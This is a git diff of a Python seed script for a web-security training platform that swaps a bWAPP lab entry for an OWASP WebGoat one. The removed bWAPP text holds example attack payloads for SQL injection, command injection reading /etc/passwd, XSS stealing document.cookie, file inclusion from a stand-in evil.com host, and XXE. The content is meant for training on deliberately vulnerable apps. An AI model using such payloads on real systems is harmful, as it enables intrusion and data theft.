@@ -96,110 +96,78 @@ Access the Score Board at `/score-board` to track your progress!
 """
         }
 
-        # Lab 2: bWAPP - Buggy Web Application
-        bwapp_lab = {
-            "title": "bWAPP Security Exploitation",
-            "description": "Practice over 100 web vulnerabilities in bWAPP (Buggy Web Application). Covers OWASP Top 10, injection flaws, and more with guided exercises.",
-            "docker_image": "raesene/bwapp:latest",
+        # Lab 2: OWASP WebGoat
+        webgoat_lab = {
+            "title": "OWASP WebGoat Security Training",
+            "description": "Learn web security through guided lessons. WebGoat teaches you about vulnerabilities with interactive exercises and hints.",
+            "docker_image": "webgoat/webgoat:latest",
             "difficulty": LabDifficulty.INTERMEDIATE,
             "category": "Web Security",
             "estimated_minutes": 75,
             "lab_type": LabType.GUACAMOLE,  # Using guacamole type for browser-based labs
-            "guacamole_url": "http://localhost:8088",  # Direct bWAPP URL
+            "guacamole_url": "http://localhost:8088/WebGoat",  # WebGoat URL
             "compose_file": os.path.abspath(os.path.join(
                 os.path.dirname(os.path.dirname(os.path.dirname(__file__))), 
                 "docker", "bwapp", "docker-compose.yml"
             )),
             "content": """
-# bWAPP Security Exploitation
+# OWASP WebGoat Security Training
 
 ## Introduction
-bWAPP (Buggy Web Application) is a deliberately insecure web application with over **100 vulnerabilities**. It covers all OWASP Top 10 risks and more.
+WebGoat is a deliberately insecure web application maintained by OWASP. It's designed to teach web security concepts through interactive lessons.
 
 ## Getting Started
-1. After starting the lab, bWAPP opens in a new tab
-2. Login with: **bee** / **bug**
-3. Click **"here"** to install the database (first time only)
-4. Select a vulnerability from the dropdown and click **Hack**
+1. After starting the lab, WebGoat opens in a new tab
+2. Click **Register new user** to create an account
+3. Login and start the lessons!
 
-## Vulnerability Categories
+## Lesson Categories
 
-### 1. SQL Injection ⭐⭐
-**Location:** SQL Injection (GET/Search)
-```sql
--- Try in the search field:
-' OR '1'='1
-' UNION SELECT 1,user(),3,4,5,6,7--
-```
+### A1: Injection ⭐⭐
+Learn about SQL injection, path traversal, and more:
+- **SQL Injection (intro)** - Basic SQL injection concepts
+- **SQL Injection (advanced)** - Union attacks, blind injection
+- **Path Traversal** - Access files outside web root
 
-### 2. Command Injection ⭐⭐
-**Location:** OS Command Injection
-```bash
-# Try after the IP address:
-; cat /etc/passwd
-| whoami
-`whoami`
-```
+### A2: Broken Authentication ⭐⭐
+- **Authentication Bypasses** - Exploit weak auth mechanisms
+- **JWT Tokens** - Crack and forge JWT tokens
+- **Password Reset** - Abuse password reset flows
 
-### 3. XSS Reflected ⭐
-**Location:** XSS - Reflected (GET)
-```html
-<script>alert('XSS')</script>
-<img src=x onerror=alert('XSS')>
-```
+### A3: Sensitive Data Exposure ⭐
+- **Insecure Login** - Find credentials in transit
+- **Crypto Basics** - Understand encryption weaknesses
 
-### 4. XSS Stored ⭐⭐
-**Location:** XSS - Stored (Blog)
-```html
-<script>alert(document.cookie)</script>
-```
+### A5: Broken Access Control ⭐⭐
+- **Insecure Direct Object References** - Access other users' data
+- **Missing Function Level Access Control** - Access admin functions
 
-### 5. File Inclusion ⭐⭐⭐
-**Location:** Remote & Local File Inclusion
-```
-# Local File Inclusion:
-?language=../../../etc/passwd
+### A7: Cross-Site Scripting (XSS) ⭐⭐
+- **Reflected XSS** - Inject scripts via URL
+- **Stored XSS** - Persist malicious scripts
+- **DOM-based XSS** - Client-side vulnerabilities
 
-# Remote File Inclusion:
-?language=http://evil.com/shell.txt
-```
+### A8: Insecure Deserialization ⭐⭐⭐
+- Learn how to exploit Java deserialization
 
-### 6. Insecure Direct Object Reference ⭐
-**Location:** Insecure DOR (Order Tickets)
-- Change ticket ID in URL to access other orders
+### A10: Insufficient Logging ⭐
+- Understand why logging matters for security
 
-### 7. XML External Entity (XXE) ⭐⭐⭐
-**Location:** XML External Entity Attacks
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-<reset><login>&xxe;</login></reset>
-```
-
-## Security Levels
-bWAPP has 3 security levels:
-- **Low** - No protection (learning)
-- **Medium** - Some filtering
-- **High** - Strong protection
-
-Start with **Low** and work your way up!
+## Tips
+- Each lesson has **hints** - click the lightbulb icon
+- Solutions are available if you get stuck
+- Complete lessons to earn points!
 
 ## Tools to Use
 - **Browser DevTools** (F12) - Inspect requests
 - **Burp Suite** - Intercept and modify traffic
-- **SQLMap** - Automated SQL injection
-- **curl** - Command-line requests
 
-## Default Credentials
-- Username: `bee`
-- Password: `bug`
-
-> **Tip:** Change the security level in the dropdown to practice bypassing filters!
+> **Tip:** WebGoat teaches concepts progressively. Start from the beginning!
 """
         }
 
         # Insert/Update labs
-        for lab_data in [juice_shop_lab, bwapp_lab]:
+        for lab_data in [juice_shop_lab, webgoat_lab]:
             existing = db.query(Lab).filter(Lab.title == lab_data["title"]).first()
             if existing:
                 print(f"Updating: {existing.title}")
@@ -214,7 +182,7 @@ Start with **Low** and work your way up!
         print("\n✅ Intermediate labs seeded successfully!")
         print("\nLabs added/updated:")
         print("  1. OWASP Juice Shop Challenges")
-        print("  2. bWAPP Security Exploitation")
+        print("  2. OWASP WebGoat Security Training")
 
     except Exception as e:
         print(f"Error: {e}")
